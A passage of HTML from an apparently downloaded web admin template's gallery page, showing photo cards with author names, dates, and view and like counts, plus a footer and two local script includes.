                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 96</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/4.jpg" alt="Photo by Peter Richards" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar4.jpg" alt="">
                                <div>
                                    <div>Peter Richards</div>
                                    <small class="d-block text-muted">18 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 76</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 6</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/5.jpg" alt="Photo by Wayne Holland" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar5.jpg" alt="">
                                <div>
                                    <div>Wayne Holland</div>
                                    <small class="d-block text-muted">16 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 106</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 36</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/6.jpg" alt="Photo by Michelle Ross" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar6.jpg" alt="">
                                <div>
                                    <div>Michelle Ross</div>
                                    <small class="d-block text-muted">4 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 77</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 7</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/7.jpg" alt="Photo by Debra Beck" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar7.jpg" alt="">
                                <div>
                                    <div>Debra Beck</div>
                                    <small class="d-block text-muted">6 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 150</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 80</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/8.jpg" alt="Photo by Phillip Peters" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar8.jpg" alt="">
                                <div>
                                    <div>Phillip Peters</div>
                                    <small class="d-block text-muted">17 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 153</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 83</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/9.jpg" alt="Photo by Jack Ruiz" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar1.jpg" alt="">
                                <div>
                                    <div>Jack Ruiz</div>
                                    <small class="d-block text-muted">15 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 143</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 73</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/10.jpg" alt="Photo by Ronald Bradley" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar2.jpg" alt="">
                                <div>
                                    <div>Ronald Bradley</div>
                                    <small class="d-block text-muted">11 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 149</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 79</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/11.jpg" alt="Photo by Kathleen Harper" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar3.jpg" alt="">
                                <div>
                                    <div>Kathleen Harper</div>
                                    <small class="d-block text-muted">16 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 164</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 94</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-4">
                        <div class="card p-3">
                            <a href="javascript:void(0)" class="mb-3">
                                <img src="assets/images/gallery/12.jpg" alt="Photo by Bobby Knight" class="rounded">
                            </a>
                            <div class="d-flex align-items-center px-2">
                                <img class="avatar avatar-md mr-3" src="assets/images/xs/avatar4.jpg" alt="">
                                <div>
                                    <div>Bobby Knight</div>
                                    <small class="d-block text-muted">6 days ago</small>
                                </div>
                                <div class="ml-auto text-muted">
                                    <a href="javascript:void(0)" class="icon"><i class="fe fe-eye mr-1"></i> 160</a>
                                    <a href="javascript:void(0)" class="icon d-none d-md-inline-block ml-3"><i class="fe fe-heart mr-1"></i> 90</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="section-body">
            <footer class="footer">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-6 col-sm-12">
                            <a href="templateshub.net">Templates Hub</a>
                        </div>
                        <div class="col-md-6 col-sm-12 text-md-right">
                            <ul class="list-inline mb-0">
                                <li class="list-inline-item"><a href="doc/index.html">Documentation</a></li>
                                <li class="list-inline-item"><a href="javascript:void(0)">FAQ</a></li>
                                <li class="list-inline-item"><a href="javascript:void(0)" class="btn btn-outline-primary btn-sm">Buy Now</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</div>

<script src="assets/bundles/lib.vendor.bundle.js"></script>

<script src="assets/js/core.js"></script>
</body>

<!-- soccer/project/page-gallery.html  07 Jan 2020 03:42:43 GMT -->
</html>
